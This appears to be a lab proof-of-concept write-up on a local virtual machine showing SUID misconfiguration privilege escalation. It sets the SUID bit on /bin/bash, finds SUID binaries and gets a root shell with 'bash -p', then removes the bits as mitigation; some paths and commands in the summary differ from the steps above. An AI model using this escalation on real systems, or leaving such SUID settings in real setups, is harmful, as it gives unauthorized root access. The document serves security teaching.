# POC-task-4
SUID & PRIVILEGE ESCALATION

✅ Setup:

step 1: Creating a Vulnerable SUID Environment

  step 1.1: Set SUID Bit on Bash (Dangerous!)

  # Grant SUID to Bash (Insecure!)
    ┌──(monish㉿vbox)-[~]
    └─$ sudo chmod u+s /bin/bash

  # Verify SUID is set
    ┌──(monish㉿vbox)-[~]
    └─$ ls -l /bin/bash  
  -rwsr-xr-x 1 root root 1298416 Oct 20 16:49 /bin/bash
  
  step 1.2: Create a Root-Owned SUID Script

  # Create a root-owned script
    ┌──(monish㉿vbox)-[~]
    └─$ sudo nano /root/root_script.sh

  # Set SUID permission on the script
    ┌──(monish㉿vbox)-[~]
    └─$ sudo chmod 4755 /root/root_script.sh

  # Verify permissions
    ┌──(monish㉿vbox)-[~]
    └─$ sudo ls -l /root/root_script.sh     
  -rwsr-xr-x 1 root root 44 Mar 19 18:30 /root/root_script.sh

✅ Exploitation:

step 2: Gaining Root Access

   ## Find SUID binaries
     ┌──(monish㉿vbox)-[~]
     └─$  find / -perm -4000 2>/dev/null
   /usr/lib/chromium/chrome-sandbox
   /usr/lib/openssh/ssh-keysign 
   /usr/lib/polkit-1/polkit-agent-helper-1
   /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   /usr/lib/xorg/Xorg.wrap .......

  ## Exploit SUID on Bash to Get Root Privileges
  # Run Bash with SUID privilege
     ┌──(monish㉿vbox)-[~]
     └─$ /bin/bash -p

  # Verify root access
     ┌──(monish㉿vbox)-[~]
     └─$ /bin/bash -p
  bash-5.2# whoami
  root

✅ Mitigation:

step 3: Fixing the Security Issues

   # Remove SUID from Bash
     ┌──(monish㉿vbox)-[~]
     └─$ sudo chmod -s /bin/bash

   # Verify SUID is removed
     ┌──(monish㉿vbox)-[~]
     └─$ ls -l /bin/bash
  -rwxr-xr-x 1 root root 1298416 Oct 20 16:49 /bin/bash

   # Change ownership and restrict access
     ┌──(monish㉿vbox)-[~]
     └─$ sudo chown root:root /root/root_script.sh
     ┌──(monish㉿vbox)-[~]
     └─$sudo chmod 700 /root/root_script.sh

   # Verify permissions
     ┌──(monish㉿vbox)-[~]
     └─$ ls -l /root/root_script.sh
  -rwx------ 1 root root 44 Mar 19 18:30 /root/root_script.sh

📌 SUMMARY:

   This Proof of Concept (PoC) demonstrates how misconfigured SUID permissions can lead to privilege escalation and how to mitigate these risks effectively.

🔹 Setup:

Set the SUID bit on /bin/bash (chmod u+s /bin/bash).

Create a root-executed script with SUID permissions (chmod 4755 /root_script.sh).

🔹 Exploitation:

Identify SUID misconfigurations (find / -perm -4000 2>/dev/null).

Escalate privileges to root using (/bin/bash -p).

Execute the root-privileged script as a normal user (./root_script.sh).

🔹 Mitigation:

Remove unnecessary SUID permissions (chmod -s /bin/bash).

Restrict execution of sensitive scripts (chown root:trusted_user /root_script.sh, chmod 750 /root_script.sh).

Verify security improvements (ls -l /bin/bash /root_script.sh).

✅ Objective: Understand privilege escalation risks due to SUID misconfigurations and implement security best practices to prevent unauthorized access.





  
